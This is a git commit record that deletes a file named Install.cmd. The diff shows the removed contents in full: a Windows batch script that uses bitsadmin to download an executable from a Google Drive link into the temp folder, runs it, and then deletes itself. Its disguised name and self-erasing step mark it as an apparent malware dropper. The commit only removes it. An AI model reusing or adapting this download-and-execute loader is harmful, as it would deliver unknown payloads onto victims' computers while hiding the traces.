f4c22d0d19b116ee8064ead9043dee0e98594bc1
0xSxZ <57729495+0xSxZ@users.noreply.github.com>
2023-03-02 19:51:06 +0100

    Delete Install.cmd

--- Install.cmd
+++
@@ -1,8 +0,0 @@
-ÿþ&cls
-ÿþ
-
-set pOut="%temp%\\out.exe"
-bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://drive.google.com/uc?id=1ZcyBk30hW7jamXrNGf5g2v2neztFPkPv&export=download&confirm=t&uuid=9480ef06-9b4e-4f0e-ac0a-e6299028aa05&at=ALgDtsyva5HexGx87k2iHuO_Caoc:1677699440626" %pOut%
-start "" %pOut%
-DEL "%~f0"
-                
